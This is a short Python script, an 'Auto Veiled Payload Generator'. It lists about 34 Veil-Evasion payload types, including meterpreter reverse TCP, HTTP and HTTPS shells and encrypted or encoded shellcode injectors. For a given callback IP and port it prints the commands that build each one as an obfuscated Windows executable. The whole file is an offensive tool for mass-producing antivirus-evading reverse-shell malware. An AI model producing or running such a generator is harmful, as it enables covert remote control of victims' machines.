import os
import argparse

veil_path = "/root/veil/Veil-Evasion/Veil-Evasion.py"

payload_list={
              ("c/meterpreter/rev_http","compile_to_exe=Y use_arya=Y"),
              ("c/meterpreter/rev_http_service","compile_to_exe=Y use_arya=Y"),
              ("c/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y"),
              ("c/meterpreter/rev_tcp_service","compile_to_exe=Y use_arya=Y"),
              ("c/shellcode_inject/flatc","compile_to_exe=Y use_arya=Y --msfpayload=windows/meterpreter/reverse_tcp"),
              ("cs/meterpreter/rev_http","compile_to_exe=Y use_arya=Y"),
              ("cs/meterpreter/rev_https","compile_to_exe=Y use_arya=Y"),
              ("cs/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y"),
              ("cs/shellcode_inject/base64_substitution","compile_to_exe=Y use_arya=Y"),
              ("cs/shellcode_inject/virtual","compile_to_exe=Y use_arya=Y"),
              ("powershell/meterpreter/rev_http","compile_to_exe=Y use_arya=Y"),
              ("powershell/meterpreter/rev_https","compile_to_exe=Y use_arya=Y"),
              ("powershell/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y"),
              ("powershell/shellcode_inject/psexec_virtual","compile_to_exe=Y use_arya=Y"),
              ("powershell/shellcode_inject/virtual","compile_to_exe=Y use_pyherion=Y"),
              ("python/meterpreter/rev_http","compile_to_exe=Y use_pyherion=Y"),
              ("python/meterpreter/rev_http_contained","compile_to_exe=Y use_pyherion=Y"),
              ("python/meterpreter/rev_https","compile_to_exe=Y use_pyherion=Y"),
              ("python/meterpreter/rev_https_contained","compile_to_exe=Y use_pyherion=Y"),
              ("python/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y use_pyherion=Y"),
              ("python/shellcode_inject/aes_encrypt","compile_to_exe=Y use_pyherion=Y"),
              ("python/shellcode_inject/arc_encrypt","compile_to_exe=Y use_pyherion=Y"),
              ("python/shellcode_inject/base64_substitution","compile_to_exe=Y use_pyherion=Y"),
              ("python/shellcode_inject/des_encrypt","compile_to_exe=Y use_pyherion=Y"),
              ("python/shellcode_inject/flat --msfpayload=windows/meterpreter/reverse_tcp","compile_to_exe=Y use_pyherion=Y"),
              ("python/shellcode_inject/letter_substitution","compile_to_exe=Y use_pyherion=Y"),
              ("python/shellcode_inject/pidinject","compile_to_exe=Y use_pyherion=Y"),
              ("ruby/meterpreter/rev_http","compile_to_exe=Y use_arya=Y"),
              ("ruby/meterpreter/rev_http_contained","compile_to_exe=Y use_arya=Y"),
              ("ruby/meterpreter/rev_https","compile_to_exe=Y use_arya=Y"),
              ("ruby/meterpreter/rev_https_contained","compile_to_exe=Y use_arya=Y"),
              ("ruby/meterpreter/rev_tcp","compile_to_exe=Y use_arya=Y"),
              ("ruby/shellcode_inject/flat","compile_to_exe=Y use_arya=Y")
              }

def CreatePayloadCommand(payload_tuple,LHOST,LPORT,path):
    file_name=payload_tuple[0].split("/")
    file_name=file_name[len(file_name)-3]+"_"+file_name[len(file_name)-2]+"_"+file_name[len(file_name)-1]+".exe"
    print "python "+veil_path+" -p "+payload_tuple[0]+" -c "+payload_tuple[1]+" LHOST="+LHOST+" LPORT="+LPORT+" --overwrite -o "+file_name
    
parser = argparse.ArgumentParser(description='Auto Veiled Payload Generator')
parser.add_argument('-LHOST',metavar='[x.x.x.x]',type=str,help='Local IP Address',required=True)
parser.add_argument('-LPORT',metavar='PORT NO', type=str,help="Port No",required=True)
parser.add_argument('-o',type=str,metavar='/path/to/outputfile',help='output folder')


args = parser.parse_args()

#check output folder
if args.o is None:
    path=os.path.expanduser("~/payloads/")
else:
    path=args.o
#create folder
if not os.path.exists(path):
    os.makedirs(path)

for payload in payload_list:
    CreatePayloadCommand(payload, args.LHOST, args.LPORT, path)
    